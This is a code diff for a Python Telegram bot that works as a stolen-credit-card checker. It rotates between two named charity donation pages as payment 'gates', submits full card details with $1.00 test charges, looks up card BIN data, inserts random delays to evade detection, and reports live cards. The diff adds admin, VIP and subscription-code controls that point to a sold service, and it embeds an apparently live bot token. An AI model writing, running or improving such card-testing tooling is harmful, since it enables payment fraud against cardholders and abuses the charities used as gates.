@@ -4,21 +4,33 @@ import time
 import random
 import asyncio
 import httpx
-from telegram import Update
-from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.ext import (
+    Application,
+    CommandHandler,
+    MessageHandler,
+    CallbackQueryHandler,
+    filters,
+    ContextTypes
+)
 
 TOKEN = '8610138136:AAHHtP1A21F3NdW6hcQHocpgkcd-GF2EE_U'
 
-# البوابات للتبديل التلقائي
+# ------------------- Users -------------------
+ADMINS = [6843321125]  # Telegram ID of admin only
+VIP_USERS = {}  # Example: {user_id: subscription_end_timestamp}
+stop_users = {}
+
+# ------------------- Gates -------------------
 GATES = [
     "https://raybensch.com/donations/support-ray/",
     "https://www.wfft.org/donations/general-donation/"
 ]
 gate_index = 0
-stop_users = {}
+api_semaphore = asyncio.Semaphore(6)  # moderate rate
 
-# تسريع الفحص (معتدل)
-api_semaphore = asyncio.Semaphore(6)  # معدل معتدل
+# ------------------- Codes -------------------
+CODES = {}  # Example: {"CODE123": {"duration": 7, "max_users": 10, "used": 0}}
 
 # ------------------- BIN Lookup -------------------
 async def get_bin_info(bin_number):
@@ -27,8 +39,7 @@ async def get_bin_info(bin_number):
         f"https://bins.antipublic.cc/bins/{bin_number}",
         f"https://bincheck.io/api/{bin_number}"
     ]
-
-    for attempt in range(3):  # 3 محاولات لتقليل Unknown
+    for attempt in range(3):
         for url in urls:
             try:
                 async with httpx.AsyncClient(timeout=10) as client:
@@ -36,7 +47,6 @@ async def get_bin_info(bin_number):
                     if r.status_code != 200:
                         continue
                     data = r.json()
-
                     brand = data.get("scheme") or data.get("brand") or data.get("type")
                     card_type = data.get("type") or data.get("card_type")
                     bank = (
@@ -49,19 +59,16 @@ async def get_bin_info(bin_number):
                         if isinstance(data.get("country"), dict)
                         else data.get("country")
                     )
-
                     if not bank:
                         bank = data.get("issuer") or data.get("bank_name")
                     if not country:
                         country = data.get("country_name")
-
                     if brand or bank or country:
                         return (
                             f"{brand or 'Unknown'} - {card_type or 'Unknown'}",
                             bank or "Unknown",
                             country or "Unknown"
                         )
-
             except:
                 continue
         await asyncio.sleep(0.5)
@@ -72,13 +79,11 @@ async def check_card_api(card_full):
     global gate_index
     gate = GATES[gate_index]
     gate_index = (gate_index + 1) % len(GATES)
-
     params = {
         "url": gate,
         "card": card_full,
         "amount": 1.00
     }
-
     async with api_semaphore:
         try:
             async with httpx.AsyncClient(timeout=20) as client:
@@ -116,8 +121,21 @@ async def format_response(card_full, status, response, taken):
 ⏱ Time: {taken}s
 """
 
+# ------------------- Check Permissions -------------------
+def can_user_check(user_id, mode="file"):
+    if user_id in ADMINS:
+        return True  # Admin unlimited
+    elif user_id in VIP_USERS:
+        return True  # VIP single/file
+    else:
+        return mode == "file"  # Normal users: file only
+
 # ------------------- /pp -------------------
 async def pp(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    if not can_user_check(user_id, mode="single"):
+        await update.message.reply_text("❌ You do not have permission for single card check.")
+        return
     asyncio.create_task(process_pp(update, context))
 
 async def process_pp(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -133,11 +151,32 @@ async def process_pp(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 # ------------------- /stop -------------------
 async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    stop_users[update.effective_user.id] = True
+    user_id = update.effective_user.id
+    stop_users[user_id] = True
     await update.message.reply_text("Stopped ⛔")
+
+# ------------------- /help -------------------
+async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    if user_id not in ADMINS:
+        await update.message.reply_text("❌ You are not an admin.")
+        return
+    commands = """
+📜 Admin Commands:
+
+/start - Start the bot
+/pp - Check single card
+/stop - Stop current check
+/admin_panel - Open admin panel
+"""
+    await update.message.reply_text(commands)
 
 # ------------------- File Handler -------------------
 async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    if not can_user_check(user_id, mode="file"):
+        await update.message.reply_text("❌ You do not have permission to check files.")
+        return
     asyncio.create_task(process_file(update, context))
 
 async def process_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -164,7 +203,6 @@ async def process_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
         card_full = match[0]
         start_time = time.time()
         status, response = await check_card_api(card_full)
-        # تأخير عشوائي 1-5 ثواني لكل بطاقة
         await asyncio.sleep(random.uniform(1, 5))
         taken = round(time.time() - start_time, 2)
         text = await format_response(card_full, status, response, taken)
@@ -175,8 +213,8 @@ async def process_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
             live += 1
             await update.message.reply_text(text)
         else:
-            declined += 1  # Declined لا تبعت رسالة
-        # تحديث اللوحة لكل بطاقة
+            declined += 1  # Declined not sent
+
         last_info, last_bank, last_country = await get_bin_info(card_full.split("|")[0][:6])
         panel = f"""📊 Status
 
@@ -208,7 +246,6 @@ async def process_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
             return
         await process_line(line)
 
-    # حفظ كل النتائج في ملف
     with open(results_file_path, 'w', encoding='utf-8') as result_file:
         for line in lines:
             r = await format_response(line.strip(), "N/A", "N/A", 0)
@@ -220,12 +257,51 @@ async def process_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text("Bot Ready ✅")
 
+# ------------------- Admin Panel -------------------
+async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    if user_id not in ADMINS:
+        await update.message.reply_text("❌ You are not an admin.")
+        return
+
+    keyboard = []
+    for u in VIP_USERS.keys():
+        uid = u
+        keyboard.append([
+            InlineKeyboardButton(f"{uid} - Ban", callback_data=f"ban_{uid}"),
+            InlineKeyboardButton(f"{uid} - Unban", callback_data=f"unban_{uid}")
+        ])
+    if not keyboard:
+        keyboard = [[InlineKeyboardButton("No users currently", callback_data="none")]]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    await update.message.reply_text("Admin Panel: Users", reply_markup=reply_markup)
+
+async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    user_id = update.effective_user.id
+    if user_id not in ADMINS:
+        await query.edit_message_text("❌ You are not an admin.")
+        return
+    data = query.data
+    if data.startswith("ban_"):
+        uid = int(data.split("_")[1])
+        VIP_USERS.pop(uid, None)
+        await query.edit_message_text(f"User banned: {uid}")
+    elif data.startswith("unban_"):
+        uid = int(data.split("_")[1])
+        VIP_USERS[uid] = int(time.time()) + 7*24*3600  # VIP 7 days example
+        await query.edit_message_text(f"User unbanned: {uid}")
+
 # ------------------- Run -------------------
 def main():
     app = Application.builder().token(TOKEN).build()
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CommandHandler("pp", pp))
     app.add_handler(CommandHandler("stop", stop))
+    app.add_handler(CommandHandler("help", help_command))
+    app.add_handler(CommandHandler("admin_panel", admin_panel))
+    app.add_handler(CallbackQueryHandler(admin_callback))
     app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
     app.run_polling()
 
